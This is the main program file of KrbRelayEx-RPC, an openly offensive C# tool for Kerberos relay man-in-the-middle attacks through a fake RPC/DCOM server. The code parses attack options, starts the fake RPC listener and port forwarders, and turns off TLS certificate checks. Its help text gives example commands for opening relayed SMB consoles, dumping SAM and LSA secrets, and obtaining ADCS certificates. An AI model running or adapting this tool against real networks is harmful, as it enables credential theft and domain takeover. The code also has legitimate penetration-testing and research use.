using KrbRelay.Clients;
//using KrbRelay.Com;
using KrbRelay.HiveParser;
using Microsoft.Win32;
//using NetFwTypeLib;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Utilities;
using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Services;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static KrbRelay.Natives;


using static System.Runtime.InteropServices.JavaScript.JSType;
using KrbRelay.Clients.Attacks.Smb;
using System.Text.RegularExpressions;
using KrbRelayEx.Misc;
using Org.BouncyCastle.Bcpg;
using Org.BouncyCastle.Ocsp;
namespace KrbRelay
{

    




    internal class Program
    {

        public const string Version = "V1.0";
        public static string DcomHost = "";
        public static string RedirectHost = "";
        public static string FakeSPN = "";
        public static int SmbListenerPort = 445;
        public static int RPCListnerPort = 135;
        public static int DcomListenerPort = 9999;
        public static string service = "";
        public static string[] RedirectPorts = null;
        public static TcpClient myclient;
        public static byte[] AssocGroup = new byte[4];
        public static byte[] CallID = new byte[4];
        public static FakeRPCServer RPCtcpFwd;
        
        public static Socket currSourceSocket { get; set; }
        public static Socket currDestSocket { get; set; }
        
        public static bool forwdardmode = false;
        public static bool Ignore = false;
        
        public static byte[] apreqBuffer;
        
        public static bool bgconsole = false;
        public static int bgconsoleStartPort = 10000;
        public static FakeRPCServer currSocketServer;
        
        public static string ExtractPortFromBinding(string binding)
        {
            // Regular expression to capture the port inside square brackets
            Match match = Regex.Match(binding, @"\[(\d+)\]");
            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            return null;
        }
        public static int FindGssApiBlob(byte[] packet)
        {
            // Look for the ASN.1 tag (0x60) that marks the start of a GSS-API token
            // followed by a valid OID like SPNEGO (OID 1.3.6.1.5.5.2 -> 06 06 2B 06 01 05 05 02)
            for (int i = 0; i < packet.Length - 4; i++)
            {
                if (packet[i] == 0x60 && packet[i + 1] == 0x82)
                {
                    // Check for SPNEGO OID
                    if (packet[i + 4] == 0x06 && packet[i + 5] == 0x06 && packet[i + 6] == 0x2B)
                    {
                        return i;
                    }
                }
            }
            return -1; // Not found
        }
    
    public static byte[] ExtractSecurityBlob(byte[] sessionSetupRequest)
        {
            // SMB2 Header is usually 64 bytes
            int smb2HeaderLength = 64;

            int securityBufferOffsetPosition = smb2HeaderLength + 12;  // SecurityBufferOffset at byte 12 after header
            int securityBufferLengthPosition = smb2HeaderLength + 14;  // SecurityBufferLength at byte 14 after header
            int securityBufferOffset = BitConverter.ToUInt16(sessionSetupRequest, securityBufferOffsetPosition);

            int securityBufferLength = BitConverter.ToUInt16(sessionSetupRequest, securityBufferLengthPosition);
byte[] securityBlob = new byte[securityBufferLength];
            Array.Copy(sessionSetupRequest, securityBufferOffset, securityBlob, 0, securityBufferLength);

            return securityBlob;
        }




        public static string HexDump(byte[] bytes, int bytesPerLine = 16, int len = 0)
        {
            if (bytes == null) return "<null>";
            int bytesLength;
            if (len == 0)
                bytesLength = bytes.Length;
            else
                bytesLength = len;
            char[] HexChars = "0123456789ABCDEF".ToCharArray();

            int firstHexColumn =
                  8                   // 8 characters for the address
                + 3;                  // 3 spaces

            int firstCharColumn = firstHexColumn
                + bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space
                + (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th
                + 2;                  // 2 spaces 

            int lineLength = firstCharColumn
                + bytesPerLine           // - characters to show the ascii value
                + Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)

            char[] line = (new string(' ', lineLength - 2) + "\r\n").ToCharArray();
            int expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;
            StringBuilder result = new StringBuilder(expectedLines * lineLength);

            for (int i = 0; i < bytesLength; i += bytesPerLine)
            {
                line[0] = HexChars[(i >> 28) & 0xF];
                line[1] = HexChars[(i >> 24) & 0xF];
                line[2] = HexChars[(i >> 20) & 0xF];
                line[3] = HexChars[(i >> 16) & 0xF];
                line[4] = HexChars[(i >> 12) & 0xF];
                line[5] = HexChars[(i >> 8) & 0xF];
                line[6] = HexChars[(i >> 4) & 0xF];
                line[7] = HexChars[(i >> 0) & 0xF];

                int hexColumn = firstHexColumn;
                int charColumn = firstCharColumn;

                for (int j = 0; j < bytesPerLine; j++)
                {
                    if (j > 0 && (j & 7) == 0) hexColumn++;
                    if (i + j >= bytesLength)
                    {
                        line[hexColumn] = ' ';
                        line[hexColumn + 1] = ' ';
                        line[charColumn] = ' ';
                    }
                    else
                    {
                        byte b = bytes[i + j];
                        line[hexColumn] = HexChars[(b >> 4) & 0xF];
                        line[hexColumn + 1] = HexChars[b & 0xF];
                        line[charColumn] = asciiSymbol(b);
                    }
                    hexColumn += 3;
                    charColumn++;
                }
                result.Append(line);
            }
            return result.ToString();
        }
        static char asciiSymbol(byte val)
        {
            if (val < 32) return '.';  // Non-printable ASCII
            if (val < 127) return (char)val;   // Normal ASCII
            // Handle the hole in Latin-1
            if (val == 127) return '.';
            if (val < 0x90) return "€.‚ƒ„…†‡ˆ‰Š‹Œ.Ž."[val & 0xF];
            if (val < 0xA0) return ".‘’“”•–—˜™š›œ.žŸ"[val & 0xF];
            if (val == 0xAD) return '.';   // Soft hyphen: this symbol is zero-width even in monospace fonts
            return (char)val;   // Normal Latin-1
        }





        //

        public static byte[] StringToByteArray(string hex)
        {
            // Remove any non-hex characters
            hex = hex.Replace(" ", "");

            // Determine the length of the byte array (each two hex characters represent one byte)
            int byteCount = hex.Length / 2;

            // Create a byte array to store the converted bytes
            byte[] byteArray = new byte[byteCount];

            // Convert each pair of hex characters to a byte
            for (int i = 0; i < byteCount; i++)
            {
                // Parse the substring containing two hex characters and convert it to a byte
                byteArray[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }

            return byteArray;
        }

        public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
        public static IntPtr ld = IntPtr.Zero;
        public static byte[] ntlm1 = new byte[] { };
        public static byte[] ntlm2 = new byte[] { };
        public static byte[] ntlm3 = new byte[] { };
        public static byte[] apRep1 = new byte[] { };
        public static byte[] apRep2 = new byte[] { };
        public static byte[] ticket = new byte[] { };
        public static string spn = "";
        public static string relayedUser = "";
        public static string relayedUserDomain = "";
        public static string domain = "";
        public static string domainDN = "";
        public static string targetFQDN = "";
        public static bool useSSL = false;
        public static bool stopSpoofing = false;
        public static bool downgrade = false;
        public static bool ntlm = false;
        public static bool InterceptKey=true;
        public static Dictionary<string, string> attacks = new Dictionary<string, string>();
        public static SMB2Client smbClient = new SMB2Client();
        public static HttpClientHandler handler = new HttpClientHandler();
        public static HttpClient httpClient = new HttpClient();
        public static CookieContainer CookieContainer = new CookieContainer();

        
        private static void PrintBanner()
        {
            Console.WriteLine("");
            Console.WriteLine("██╗  ██╗██████╗ ██████╗ ██████╗ ███████╗██╗      █████╗ ██╗   ██╗███████╗██╗  ██╗");
            Console.WriteLine("██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝╚██╗██╔╝");
            Console.WriteLine("█████╔╝ ██████╔╝██████╔╝██████╔╝█████╗  ██║     ███████║ ╚████╔╝ █████╗   ╚███╔╝");
            Console.WriteLine("██╔═██╗ ██╔══██╗██╔══██╗██╔══██╗██╔══╝  ██║     ██╔══██║  ╚██╔╝  ██╔══╝   ██╔██");
            Console.WriteLine("██║  ██╗██║  ██║██████╔╝██║  ██║███████╗███████╗██║  ██║   ██║   ███████╗██╔╝ ██╗");
            Console.WriteLine("╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝");
            Console.WriteLine("\r\r################################################################################");
            Console.WriteLine("#                                                                              #");
            Console.WriteLine("#                        KrbRelayEx-RPC by @decoder_it                         #");
            Console.WriteLine("#                                                                              #");
            Console.WriteLine("#       Kerberos Relay and Forwarder for (Fake) RPC/DCOM MiTM Server           #");
            Console.WriteLine("#                                                                              #");
            Console.WriteLine("#                                {0} - 2024                                   #", Version);
            Console.WriteLine("#                                                                              #");
            Console.WriteLine("#          Github: https://github.com/decoder-it/KrbRelayEx-RPC                #");
            Console.WriteLine("#                                                                              #");
            Console.WriteLine("################################################################################");


        }
        private static void ShowCommands()
        {
            Console.WriteLine("[*] Hit:\r\n\t=> 'q' to quit,\r\n\t=> 'r' for restarting Relaying and Port Forwarding,\r\n\t=> 's' for Forward Only\r\n\t=> 'l' for listing connected clients");
        }
        private static void ShowHelp()
        {


            PrintBanner();
          
            Console.WriteLine();
            Console.WriteLine("Description:");
            
            Console.WriteLine("  KrbRelayEx-RPC is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.");
            Console.WriteLine("  It listens for incoming authenticated ISystemActivator requests, extracts dynamic port bindings from EPMAPPER/OXID resolutions,");
            Console.WriteLine("  captures the AP-REQ for accessing SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints), then dynamically");
            Console.WriteLine("  and transparently forwards the victim's requests to the real destination host and port");
            
            Console.WriteLine("  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired RPC/DCOM appliaction");
            Console.WriteLine();
            Console.WriteLine("Usage:");
                Console.WriteLine("  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]");
                Console.WriteLine();

                Console.WriteLine("SMB Attacks:");
                Console.WriteLine("  -console                       Start an interactive SMB console");
                Console.WriteLine("  -bgconsole                     Start an interactive SMB console in background via sockets");
                Console.WriteLine("  -list                          List available SMB shares on the target system");
                Console.WriteLine("  -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)");
                Console.WriteLine("  -secrets                       Dump SAM & LSA secrets from the target system");
                Console.WriteLine();

                Console.WriteLine("HTTP Attacks:");
                Console.WriteLine("  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')");
                Console.WriteLine("  -adcs <TEMPLATE>               Generate a certificate using the specified template");
                Console.WriteLine();

                Console.WriteLine("Options:");
                Console.WriteLine("  -redirectserver <IP>           Specify the IP address of the target server for the attack");
                Console.WriteLine("  -ssl                           Use SSL transport for secure communication");
                Console.WriteLine("  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,445,5985')");
                Console.WriteLine("  -rpcport <PORT>                Specify the RPC port to listen on (default: 135)");
                Console.WriteLine();

                Console.WriteLine("Examples:");
                Console.WriteLine("  Start an interactive SMB console:");
                Console.WriteLine("    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>");
                Console.WriteLine();
                Console.WriteLine("  List SMB shares on a target:");
                Console.WriteLine("    KrbRelay.exe -spn CIFS/target.domain.com -list");
                Console.WriteLine();
                Console.WriteLine("  Dump SAM & LSA secrets:");
                Console.WriteLine("    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>");
                Console.WriteLine();
                Console.WriteLine("  Start a background SMB console on port 10000 upon relay:");
                Console.WriteLine("    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>");
                Console.WriteLine();
                Console.WriteLine("  Generate a certificate using ADCS with a specific template:");
                Console.WriteLine("    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>");
                Console.WriteLine();
                Console.WriteLine("  Relay attacks with SSL and port forwarding:");
                Console.WriteLine("    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver <ip_target_host> -redirectports 3389,5985,135,553,80");
                Console.WriteLine();

            Console.WriteLine("Notes:");
            Console.WriteLine("  - KrbRelayEx intercepts and relays the first authentication attempt,");
            Console.WriteLine("    then switches to forwarder mode for all subsequent incoming requests.");
            Console.WriteLine("    You can press any time 'r' for restarting relay mode");
            Console.WriteLine();
            Console.WriteLine("  - This tool is particularly effective if you can manipulate DNS names. Examples include:");
            Console.WriteLine("    - Being a member of the DNS Admins group.");
            Console.WriteLine("    - Having zones where unsecured DNS updates are allowed in Active Directory domains.");
            Console.WriteLine("    - Gaining control over HOSTS file entries on client computers.");
            Console.WriteLine();
            Console.WriteLine("  - Background consoles are ideal for managing multiple SMB consoles");
            Console.WriteLine("");
            Console.WriteLine("** IMPORTANT: Ensure that you configure the entries in your hosts file to point to the actual target IP addresses!");

        }




     public static async Task Main(string[] args)

    //public static void Main(string[] args)
        {
            


            bool show_help = false;

            //Guid clsId_guid = new Guid();
            PrintBanner();

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();


                switch (argument)
                {
                    case "-DCOMHOST":
                    case "/DCOMHOST":
                    case "-SMBHOST":
                    case "/SMBHOST":
                        DcomHost = args[entry.index + 1];
                        break;
                    case "-FAKESPN":
                    case "/FAKESPN":
                        FakeSPN = args[entry.index + 1];
                        break;
                    case "-REDIRECTHOST":
                    case "/REDIRECTHOST":
                        RedirectHost = args[entry.index + 1];
                        break;
                    case "-REDIRECTPORTS":
                    case "/REDIRECTPORTS":
                        RedirectPorts = args[entry.index + 1].Split(',');

                        break;
                    case "-SMBPORT":
                    case "/SMBPORT":
                        SmbListenerPort = int.Parse(args[entry.index + 1]);
                        break;
                    case "-RPCPORT":
                    case "/RPCPORT":
                        RPCListnerPort = int.Parse(args[entry.index + 1]);
                        break;
                    case "-DCOMPORT":
                    case "/DCOMPORT":
                        DcomListenerPort = int.Parse(args[entry.index + 1]);
                        break;
                    case "-BGCONSOLESTARTPORT":
                    case "/BGCONSOLESTARTPORT":
                        bgconsoleStartPort = int.Parse(args[entry.index + 1]);
                        break;
                    //
                    case "-CONSOLE":
                    case "/CONSOLE":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("console", "");
                        }
                        break;
                    case "-BGCONSOLE":
                    case "/BGCONSOLE":
                        bgconsole = true;
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("console", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("console", "");
                        }
                        break;
                   
                    // smb attacks
                    case "-LIST":
                    case "/LIST":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("list", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("list", "");
                        }
                        break;

                 
                    case "-SECRETS":
                    case "/SECRETS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("secrets", args[entry.index + 1]);
                        }
                        catch
                        {
                            attacks.Add("secrets", "");
                        }
                        break;

                    
                    case "-SERVICE-ADD":
                    case "/SERVICE-ADD":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            if (args[entry.index + 2].StartsWith("/") || args[entry.index + 2].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("service-add", args[entry.index + 1] + " " + args[entry.index + 2]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -service-add requires two arguments");
                            return;
                        }
                        break;

                    
                    // http attacks
                 
                    case "-ADCS":
                    case "/ADCS":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("adcs", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -adcs requires an argument");
                            return;
                        }
                        break;

                    
                    //optional
                    case "-H":
                    case "/H":
                    case "-HELP":
                    case "/HELP":
                        show_help = true;
                        break;


                    case "-SPN":
                    case "/SPN":
                        spn = args[entry.index + 1];
                        break;

                    case "-ENDPOINT":
                    case "/ENDPOINT":
                        try
                        {
                            if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
                                throw new Exception();
                            attacks.Add("endpoint", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -endpoint requires an argument");
                            return;
                        }
                        break;


                    case "-RELAYEDUSER":
                    case "/RELAYEDUSER":
                        relayedUser = args[entry.index + 1];
                        break;
                    case "-RELAYEDUSERDOMAIN":
                    case "/RELAYEDUSERDOMAIN":
                        relayedUserDomain = args[entry.index + 1];
                        break;
                }
            }

            if (show_help)
            {
                ShowHelp();
                return;
            }

            if (string.IsNullOrEmpty(spn) && ntlm == false)
            {
                Console.WriteLine("KrbRelayEx.exe -h for help");
                return;
            }

            if (!string.IsNullOrEmpty(spn))
            {
                service = spn.Split('/').First().ToLower();
                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
                {
                    Console.WriteLine("'{0}' service not supported", service);
                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
                    return;
                }
                string[] d = spn.Split('.').Skip(1).ToArray();
                domain = string.Join(".", d);

                string[] dd = spn.Split('/').Skip(1).ToArray();

                targetFQDN = string.Join(".", dd);

            }
            service = spn.Split('/').First();
            if (!string.IsNullOrEmpty(domain))
            {
                var domainComponent = domain.Split('.');
                foreach (string dc in domainComponent)
                {
                    domainDN += string.Concat(",DC=", dc);
                }
                domainDN = domainDN.TrimStart(',');
            }

            //
            //setUserData(sessionID);
            string pPrincipalName;
            if (FakeSPN == "")
                pPrincipalName = spn;
            else
                pPrincipalName = FakeSPN;

            if (service == "http")
            {
                if (!attacks.Keys.Contains("endpoint") || string.IsNullOrEmpty(attacks["endpoint"]))
                {
                    Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                    return;
                }
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                handler = new HttpClientHandler() { UseDefaultCredentials = false, PreAuthenticate = false, UseCookies = true };

                httpClient = new HttpClient(handler) { Timeout = new TimeSpan(0, 0, 10) };
                string transport = "http";
                if (useSSL)
                {
                    transport = "https";
                }
                httpClient.BaseAddress = new Uri(string.Format("{0}://{1}", transport, targetFQDN));

            }

            forwdardmode = false;

            
            RPCtcpFwd = new FakeRPCServer(RPCListnerPort, RedirectHost, 135, "RPC");

            RPCtcpFwd.Start(false);
            List<PortForwarder> tcpForwarders = new List<PortForwarder>();

            if (RedirectPorts != null)
            {
                foreach (string item in RedirectPorts)
                {

                    Console.WriteLine("[*] Starting Forwarder for:{0}", item);
                    tcpForwarders.Add(new PortForwarder(int.Parse(item), RedirectHost, int.Parse(item)));
                }
                foreach (PortForwarder item in tcpForwarders)
                {
                    item.StartAsync();
                }
            }

          
            Console.WriteLine("[*] KrbRelayEx started");


            ShowCommands();
            
            while (true)
            {
                //Thread.Sleep(500);
                if (Console.KeyAvailable)
                {

                    ConsoleKeyInfo key = Console.ReadKey(intercept: true);
                    if (key.KeyChar == '\n' || key.KeyChar == '\r')
                    {
                        ShowCommands();
                        
                    }
                    if (key.KeyChar == 'q')
                        return;

                    if (key.KeyChar == 'l')
                    {
                        RPCtcpFwd.ListConnectedClients();

                    }

                    if (key.KeyChar == 'b')
                    {
                        bgconsole = !bgconsole;
                        Console.WriteLine("[!] Background SMB console mode:{0}", bgconsole);
                    }

                        if (key.KeyChar == 'r')
                    {
                        Console.WriteLine("[!] Restarting Relay...");

                        RPCtcpFwd.Stop();
                        forwdardmode = false;
                        RPCtcpFwd.Start(false);

                    }
                    if (key.KeyChar == 's')
                    {
                        Console.WriteLine("[!] Restarting in Forward only...");

                        RPCtcpFwd.Stop();
                        forwdardmode = true;
                        RPCtcpFwd.Start(true);

                    }

                }
                Thread.Sleep(300);

            }

        }
    }
}